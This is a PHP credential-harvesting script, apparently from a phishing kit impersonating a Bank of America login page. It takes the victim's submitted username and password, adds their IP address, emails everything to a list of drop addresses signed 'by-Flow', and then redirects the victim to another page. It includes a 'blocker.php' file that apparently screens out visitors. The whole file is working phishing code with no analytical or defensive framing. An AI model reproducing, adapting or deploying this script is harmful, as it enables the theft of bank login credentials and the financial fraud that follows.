<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "BOFA---USA--PASSS-----------\n";
$message .= "Usaname 0r Email Addy: " .$_POST['username']."\n\n";
$message .= "Passw0 0nline: " .$_POST['pass']."\n\n";
$message .= "BOFA---USA--PASSS-----------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "---by-Flow------\n";
$recipient = "donflow2021@yahoo.com,ceocfo1988@aol.com,donflowmania@yahoo.com, user0202777a@gmail.com, jcole15000@hotmail.com, donflowmania@maine.rr.com";
$subject = "Bofa-Edd-Username-And-Password";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."B0faEdd";
$headers .= "B0FA---Usa--Usa&Pass";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: -^=-.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        